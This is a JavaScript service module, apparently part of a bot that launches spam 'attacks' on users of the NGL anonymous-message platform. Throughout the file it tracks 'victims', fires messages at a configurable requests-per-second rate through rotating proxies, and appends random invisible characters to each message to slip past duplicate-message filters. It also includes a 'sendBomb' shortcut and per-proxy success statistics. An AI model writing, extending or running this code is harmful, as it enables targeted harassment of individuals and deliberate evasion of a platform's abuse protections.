import { NGLService } from "./ngl.service.js";
import { StatsService } from "./stats.service.js";
import { UserService } from "./user.service.js";
import { NotificationService } from "./notification.service.js";
import { ProxyService } from "./proxy.service.js";
import crypto from 'crypto';

export const AttackService = {
    // Single process state
    activeAttacks: new Map(),
    emergencyLockdown: false,

    // Stats accumulation (formerly workerStats)
    statsBuffer: {
        success: 0,
        failed: 0,
        attacks: new Map() // username -> { success, failed, messageStats, proxyStats }
    },

    async triggerEmergencyShutdown() {
        if (this.emergencyLockdown) return;
        this.emergencyLockdown = true;
        console.error('🚨 EMERGENCY SHUTDOWN TRIGGERED: NO PROXIES AVAILABLE');

        // Stop all active attacks
        for (const [username, state] of this.activeAttacks.entries()) {
            await this.stopAttack(username, state.userId, state.userTag, true);
        }

        if (process.env.OWNER_ID) {
            await NotificationService.notifyEmergency(process.env.OWNER_ID);
        }
    },

    async startSpam(username, messages, rps, duration, userId, userTag, channelId = null, messageLimit = null) {
        // Check proxies
        if (ProxyService.proxies.length === 0) {
             console.warn('⚠️ No proxies loaded. Running in direct mode (Risky).');
        } else {
             console.log(`✅ Using ${ProxyService.proxies.length} proxies for attack on ${username}`);
        }

        if (this.activeAttacks.has(username)) {
            return { success: false, message: `Attack already active for ${username}` };
        }

        if (this.emergencyLockdown) {
            return { success: false, message: 'System is in emergency lockdown mode.' };
        }

        // DB Init
        await StatsService.trackVictim(username);
        await StatsService.incrementAttackCount(username);
        await UserService.logActivity(userId, userTag, 'ATTACK_START', `Target: ${username}, RPS: ${rps}, Duration: ${duration}s`);

        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        const sessionId = crypto.randomUUID();

        await StatsService.createAttackSession({
            id: sessionId,
            victim_username: username,
            start_time: startTime,
            params: { rps, duration, messages }
        });

        // Initialize State
        const attackState = {
            username,
            userId,
            userTag,
            type: 'spam',
            rps,
            duration,
            messages, // Store messages for resume
            sessionId,
            startTime, // Critical for UI
            endTime,   // Critical for UI
            paused: false,
            pauseStartTime: 0,
            totalPausedTime: 0,
            active: true,
            messageLimit: messageLimit || null, // null = unlimited
            sentCount: 0                        // track successful sends
        };

        this.activeAttacks.set(username, attackState);

        // Start Attack Loop
        this._startAttackLoop(username, messages, rps, messageLimit);

        // Auto-stop timer
        setTimeout(async () => {
            if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
                await this.stopAttack(username, userId, userTag, true);
            }
        }, duration * 1000);

        return { success: true };
    },

    _startAttackLoop(username, messages, rps, messageLimit = null) {
        // Fire messages smoothly distributed over time to honor the Requests Per Second limit
        const intervalMs = 100;
        // e.g. 50 RPS => 5 requests every 100ms to avoid overwhelming network Sockets
        const batchSize = Math.max(1, Math.floor(rps / 10));

        let msgIndex = 0;

        const attackLoop = async () => {
            if (!this.activeAttacks.has(username)) return;
            const state = this.activeAttacks.get(username);
            if (state.paused) return; 

            for (let i = 0; i < batchSize; i++) {
                if (!this.activeAttacks.has(username)) return; 

                const currentState = this.activeAttacks.get(username);
                if (messageLimit && currentState.sentCount >= messageLimit) {
                    console.log(`✅ Message limit (${messageLimit}) reached for ${username}. Stopping.`);
                    this.stopAttack(username, currentState.userId, currentState.userTag, true);
                    return;
                }

                const rawMsg = messages[msgIndex % messages.length];
                msgIndex++;
                const msg = this.variateMessage(rawMsg);

                NGLService.sendMessageWithProxyFallback(username, msg)
                    .then(result => {
                        if (!this.activeAttacks.has(username)) return;
                        const s = this.activeAttacks.get(username);
                        if (!s.paused) {
                            if (result.success) s.sentCount++;
                            this.recordStat(username, result.success, rawMsg, result);
                        }
                    })
                    .catch(() => {
                        if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
                            this.recordStat(username, false, rawMsg, { error: 'Unknown' });
                        }
                    });
            }

            if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
                state.timeoutId = setTimeout(attackLoop, intervalMs);
            }
        };

        attackLoop();
    },

    async stopAttack(username, userId, userTag, auto = false) {
        if (this.activeAttacks.has(username)) {
            const attackState = this.activeAttacks.get(username);

            // Clear loop
            attackState.active = false;
            if (attackState.timeoutId) clearTimeout(attackState.timeoutId);

            this.activeAttacks.delete(username);

            if (!auto) {
                await UserService.logActivity(userId, userTag, 'ATTACK_STOP', `Stopped attack on ${username}`);
            }

            if (attackState.sessionId) {
                await StatsService.updateAttackSession(attackState.sessionId, {
                    status: 'STOPPED',
                    end_time: Date.now()
                });
            }
            return true;
        }
        return false;
    },

    async pauseAttack(username) {
        if (this.activeAttacks.has(username)) {
            const state = this.activeAttacks.get(username);
            if (!state.paused) {
                state.paused = true;
                state.pauseStartTime = Date.now();
                if (state.timeoutId) clearTimeout(state.timeoutId);

                // Update session status
                // await StatsService.updateAttackSession(...)
                return true;
            }
        }
        return false;
    },

    async resumeAttack(username) {
        if (this.activeAttacks.has(username)) {
            const state = this.activeAttacks.get(username);
            if (state.paused) {
                state.paused = false;
                const pauseDuration = Date.now() - state.pauseStartTime;
                state.totalPausedTime += pauseDuration;

                // Adjust end time so duration remains valid
                state.endTime += pauseDuration;

                // Restart loop
                this._startAttackLoop(username, state.messages, state.rps, state.messageLimit);

                // Re-arm auto-stop timer
                const remainingTime = state.endTime - Date.now();
                if (remainingTime > 0) {
                    state.timeoutId = setTimeout(async () => {
                        if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
                            await this.stopAttack(username, state.userId, state.userTag, true);
                        }
                    }, remainingTime);
                }

                return true;
            }
        }
        return false;
    },



    getActiveCount() {
        return this.activeAttacks.size;
    },

    variateMessage(text) {
        const invisibleChars = ['\u200B', '\u200C', '\u200D', ' '];
        // Add 1-3 random invisible characters to bypass simple duplication filters
        let suffix = '';
        const count = Math.floor(Math.random() * 3) + 1;
        for (let i = 0; i < count; i++) {
            suffix += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
        }
        return text + suffix;
    },

    recordStat(username, isSuccess, message, result) {
        // Direct DB update or buffer? Buffer is better for performance.
        // We will buffer and periodically flush to StatsService.

        if (isSuccess) this.statsBuffer.success++;
        else this.statsBuffer.failed++;

        if (!this.statsBuffer.attacks.has(username)) {
            this.statsBuffer.attacks.set(username, {
                success: 0,
                failed: 0,
                messageStats: new Map(),
                proxyStats: new Map()
            });
        }
        const stats = this.statsBuffer.attacks.get(username);
        if (isSuccess) stats.success++;
        else stats.failed++;

        if (!stats.messageStats.has(message)) {
            stats.messageStats.set(message, { success: 0, failed: 0 });
        }
        const msgStats = stats.messageStats.get(message);
        if (isSuccess) msgStats.success++;
        else msgStats.failed++;

        if (result && result.proxy) {
            const current = stats.proxyStats.get(result.proxy) || 0;
            stats.proxyStats.set(result.proxy, current + 1);
        }
    },

    getAndResetStats() {
        const payload = {
            success: this.statsBuffer.success,
            failed: this.statsBuffer.failed,
            details: {}
        };

        for (const [user, s] of this.statsBuffer.attacks.entries()) {
            const msgDetails = {};
            for (const [msg, counts] of s.messageStats.entries()) {
                msgDetails[msg] = { s: counts.success, f: counts.failed };
            }
            const proxyDetails = {};
            for (const [proxy, count] of s.proxyStats.entries()) {
                proxyDetails[proxy] = count;
            }

            payload.details[user] = {
                s: s.success,
                f: s.failed,
                m: msgDetails,
                p: proxyDetails
            };
        }

        // Reset
        this.statsBuffer.success = 0;
        this.statsBuffer.failed = 0;
        this.statsBuffer.attacks.clear();

        return payload;
    },

    // Stub
    async sendBomb(username, message, count, userId, userTag) {
        return this.startSpam(username, [message], 100, count / 100, userId, userTag);
    }
};
